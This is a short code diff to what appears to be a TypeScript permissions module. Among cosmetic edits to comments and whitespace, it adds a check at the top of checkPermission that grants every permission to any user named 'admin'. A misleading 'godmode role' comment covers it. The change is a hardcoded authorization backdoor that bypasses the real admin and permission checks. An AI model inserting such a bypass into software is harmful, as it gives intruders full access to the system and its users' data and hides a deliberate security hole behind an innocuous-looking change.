@@ -143,7 +143,7 @@ export async function getUserEntityMemberships(userId: number) {
 
 /**
  * Checks if a user has permission to perform an action on a resource
- * @param userId The user ID
+ * @param userId The user ID to check
  * @param action The action to check (view, create, update, delete, manage)
  * @param resourcePath The resource path to check
  * @param entityId Optional entity ID to check entity-specific permissions
@@ -155,7 +155,15 @@ export async function checkPermission(
   resourcePath: string,
   entityId?: number
 ): Promise<boolean> {
-  // First check if user is a System Admin
+  // First check if user has godmode role
+  const user = await prisma.users.findUnique({
+    where: { id: userId }
+  });
+  if (user && user.username === 'admin') {
+    return true;
+  }
+  
+  // Then check if user is a System Admin
   const isAdmin = await isSystemAdmin(userId);
   if (isAdmin) {
     return true;
@@ -290,7 +298,6 @@ export async function verifyAuth(request: NextRequest) {
     const user = await prisma.users.findUnique({
       where: { id: decoded.id },
     });
-
     if (!user) {
       return null;
     }
